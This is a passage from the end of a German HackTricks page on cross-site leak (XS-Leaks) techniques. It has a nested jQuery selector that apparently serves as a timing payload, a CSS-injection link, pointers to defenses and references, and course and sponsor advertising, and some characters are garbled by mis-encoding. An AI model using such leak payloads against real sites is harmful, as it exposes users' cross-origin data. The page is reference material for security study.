$("*:has(*:has(*:has(*)) *:has(*:has(*:has(*))) *:has(*:has(*:has(*)))) main[id='site-main']")
```
### CSS Injection

{% content-ref url="xs-search/css-injection/" %}
[css-injection](xs-search/css-injection/)
{% endcontent-ref %}

## Abwehrma√ünahmen

Es gibt empfohlene Ma√ünahmen in [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) sowie in jedem Abschnitt des Wikis [https://xsleaks.dev/](https://xsleaks.dev/). Schauen Sie dort nach weiteren Informationen dar√ºber, wie man sich gegen diese Techniken sch√ºtzen kann.

## Referenzen

* [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf)
* [https://xsleaks.dev/](https://xsleaks.dev)
* [https://github.com/xsleaks/xsleaks](https://github.com/xsleaks/xsleaks)
* [https://xsinator.com/](https://xsinator.com/)
* [https://github.com/ka0labs/ctf-writeups/tree/master/2019/nn9ed/x-oracle](https://github.com/ka0labs/ctf-writeups/tree/master/2019/nn9ed/x-oracle)

<details>

<summary><strong>Erlernen Sie AWS-Hacking von Null auf Held mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere M√∂glichkeiten, HackTricks zu unterst√ºtzen:

* Wenn Sie Ihr **Unternehmen in HackTricks beworben sehen m√∂chten** oder **HackTricks als PDF herunterladen m√∂chten**, √ºberpr√ºfen Sie die [**ABONNEMENTPL√ÑNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merch**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories einreichen.

</details>

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Verwenden Sie [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks), um m√ºhelos Workflows zu erstellen und zu **automatisieren**, unterst√ºtzt von den weltweit **fortschrittlichsten** Community-Tools.\
Heute Zugriff erhalten:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
